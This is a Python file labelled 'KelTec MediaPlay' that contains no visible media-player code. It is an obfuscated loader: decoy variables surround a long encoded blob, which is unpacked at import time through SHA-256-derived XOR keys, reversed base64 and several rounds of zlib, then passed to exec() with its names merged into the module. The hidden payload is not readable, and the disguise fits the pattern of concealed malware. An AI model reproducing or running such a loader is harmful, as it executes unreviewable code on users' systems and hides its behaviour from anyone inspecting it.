# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 913225 ^ 404974
_lx1_1 = len("aeb648")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-249360)
_lx3_3 = 873462 * 0
_lx4_4 = 266214 ^ 839311
_K = 'da1f87663f6185ce8cf3bc4c88af30c63250a55a39f785ce0bd3840736c92ccc'
_M = 'jnI3K552C1aNpW31vKiGfr8zGRFDCmZEE9KfcbFVYHzZcmImxy5WStP1Y6fvoNt16D4dFURZZEBCg85xsA5hLdIhNSDDL1cW0aBn'
_D = 'gZpnYwWMnIqZNu9FMr4SUss1aHeAl3HtOp12inyl9EGwksasAkFfVvd9YeLGLaWXM++EXYp62lhNcKKqEGC9WVdpwucf5/YGpMsBNGn7VuY3IduHjUotBmBD6rCKjzYfWpxjW8MQgvUUW6mCNdipo6iPYFJv5r+H4w1b00MMe93UzKWuUUd0z/WPowjOkoWr/G7QEeJTONODhETAxCQMDTVE56x+qEA/ks3Aj56Jr5g/6y8Lv526UsHFABO8wxgFjLw3VcQDpTgFKecezS89OTceflNQ550KA3dOSMyBiPmbKtWQ7KCHgFHhvZdpFQD6hzBX+fMoquC9A7h8qxTeZpLOl1KOXifk9clzaATRrKZRtHe1k0Jegb/T5LuhS84l2Cp7rm1dpZc0SVDfM5c6+iNzhgCXclk5sC8NBU1R/gAgRRRHpaPZiFsp5Yo9tcPGknjO7iDu7gWeAS6V+W16MCrxmcglY2JX+T7FK+MDIMLYyWQFcxEd3o2PtyHZLUXmDzh2+XuFiApGkFjLhY/r9Nu6kifS3HNcvMVCA+lP0v/yN0MWTPKs02QNRxLRYyEJNOct6ITPPkHpLRB1D9tvpFNFosisC717FzgqmjNO27qGzLOvcNzACsRl4BIEx0rrrWtr2b/PT7/4ni842W7AL570M5HtZMZhTMXGFv7f/dpPyLWGboMKRVRL4BSAvuat2Tm+URfK57C9/ofnIkpcjIblAKZBPEFdM6NzhMwbZCx7z+1PkBifmxer5CMJCp7AqBYTcuGkf/y2Klo8iHuqXt4jr+nabGfn7QWNT7Sg9d0rF09TD44x2VcJkOPblmGmO8WfiIvqkX/lJ1LVs99S2QA2DKfia3JWzmcgUvzp2hV455P9KPbWa+5euwHVWh4OG6a6SngaPP/YtizPUid83WeiByIuSMP2oq2XyTSF4conVJikB01TPmbwVWv5q1owPM2hLWKOC9F1lNTWupvs3K1MwFSv+JvALyMnzdB4Clh9FxZyjHATL3YHpOANf/Sjn5fQjXUpF475p0K1rQf7azb5ooCmis62IQvL1WWqW4ndEXvA1nPUclZv7695HxSb/+ZcGJE2VRJ1Kcb5B2gG9RjBZoGyh0P9y4V18NQVU8J7XqCL6FoA6jxBxeJDF4/hxLR45f+0d7t/jNfmSCTGBy9wYbOa+42IX6c9RJIkPpLkr566yahsMDz8E8Fz343BiOp5acD1NHXmo2FwPDNZmOx+pO2QTmGJ6EduTVCqBDy+GXFkq2rECbNm9G0tSc6ePUj+b2UdrbI0xSzY2qAIbFLwugebXJ8bgTG+OaIiK9XqfA8GNL6/14uHvsxfL/tMxNaITt/oKLAi+yPFdnVVxQpSB9qGBG+f5dTiM/TTJp3P0MqZ728xQAQp4lLE+5oqmWI+gRmJwgyiD9Mp3uGlXU6s+gsHq7i85Z6aJvDpW9doE4nRll4UXZSV8iTNOYFT52YqywS/I/txeIk5FxiqnbDv203jPYbRlzuBUwClj1XTbDtmrZHVTASQWEIHexwtC2cmYvNfyFpGV89IDYx9eumOk8La7VWFSyT9o5PM848KnlPx2kkzSPyxyDSUxdJa7V3UFBzGfgjW6kjQw5vxu5fHkE4oDQ15kA9UURAuO96nvUDU5Y/gt2Mv'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})